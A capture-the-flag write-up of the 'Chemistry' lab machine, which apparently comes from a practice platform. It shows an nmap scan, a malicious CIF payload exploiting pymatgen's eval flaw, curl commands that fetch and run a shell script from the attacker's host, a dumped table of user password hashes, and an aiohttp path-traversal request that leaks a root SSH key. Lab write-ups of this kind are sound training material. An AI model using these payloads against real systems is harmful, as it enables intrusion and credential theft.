# Chemistry

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 01:09 IST
Nmap scan report for 10.129.162.207 (10.129.162.207)
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 19 Oct 2024 19:39:14 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close

<< SNIP >>

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.44 seconds

```

## Web (python eval - RCE)

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

We can register ourselves on the webpage.

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

[http://10.129.162.207:5000/static/example.cif](http://10.129.162.207:5000/static/example.cif)\
this URL downloads a simple example of CIF file.

```bash
╰─➤  cat example.cif              
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

Uploading that gives us a UI'd version of the above data

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

### Recon

To know more about backend we can start looking at the headers, it's using python in the backend.

Now to know what service this is, we can goodle more about what's `CIF` files, \
Now if we take any text from the example.ctf file `_symmetry_space_group_name_H-M` and google this, we can get the github repo of this open source project.

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

It's [https://github.com/materialsproject/pymatgen](https://github.com/materialsproject/pymatgen)\
Next thing we can do is google vulnerabilites of this project

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2024-23346" %}
First google search URL
{% endembed %}

POC : [https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

Following the POC, we can craft malicious CIF file and get RCE since it's using `eval` in the backend.

#### Malicious file

```python
╰─➤  cat ape.cif    
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.13.47:4444/test");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

```bash
╰─➤  python3 -m http.server 4444 
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.162.207 - - [20/Oct/2024 01:34:32] code 404, message File not found
10.129.162.207 - - [20/Oct/2024 01:34:32] "GET /test HTTP/1.1" 404 -
```

DONE, just update the payload and get a shell.

```python
# get our payload on server
("os").system ("curl 10.10.13.47:4444/pwn.sh -o /tmp/pwn.sh");0,0,0'

# get a shell
("os").system ("/bin/bash /tmp/pwn.sh");0,0,0'
```

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

There's a database file in `/home/app/instance` called `database.db`

## User - rosa

After taking it in our system we can view contents with sqlite3

```sql
sqlite> .tables
structure  user     
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|test|098f6bcd4621d373cade4e832627b4f6
```

`3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5` Lets crack rosa password, since it's a user on the box.

```bash
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

creds: `rosa:unico <SNIP> sados`

```bash
╰─➤  ssh rosa@10.129.126.21                                                                                                                                                                                                              130 ↵
The authenticity of host '10.129.126.21 (10.129.126.21)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.126.21' (ED25519) to the list of known hosts.
rosa@10.129.126.21's password: 
<SNIP>
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
```

## Root

```bash
rosa@chemistry:/tmp$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9001            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

we see there's another app running under port 8080

```bash
rosa@chemistry:/tmp$ curl -I localhost:8080
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Sun, 20 Oct 2024 03:57:21 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Server is `aiohttp/3.9.1`\
Looking out for vulnerabilites, we can find this blog

{% embed url="https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-6209406" %}

Let's do portforwading and bring that web service to our local system

```bash
ssh -L 8888:127.0.0.1:8080 rosa@10.129.126.21  
```

<figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

A static website not worth looking for, let's dive for LFI

### POC

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

For a proper shell, we can try getting files under `/root/.ssh/`

`GET /assets/../../../../../../../../../../../../../../../root/.ssh/id_rsa` gives us the private key.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3Gk
HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITbo

<< SNIP >>

OlOfMO4xkLwj4rPIcqbGzi0Ant/O+V7NRN/mtx7xDL7oBwhpRDE1Bn4ILcsneX5YH/XoBh
1arrDbm+uzE+QNAAAADnJvb3RAY2hlbWlzdHJ5AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

### SHELL

```bash
╰─➤  chmod 400 root_id_rsa 
                             
╰─➤  ssh -i root_id_rsa root@10.129.126.21   
<SNIP>
Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# 
```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
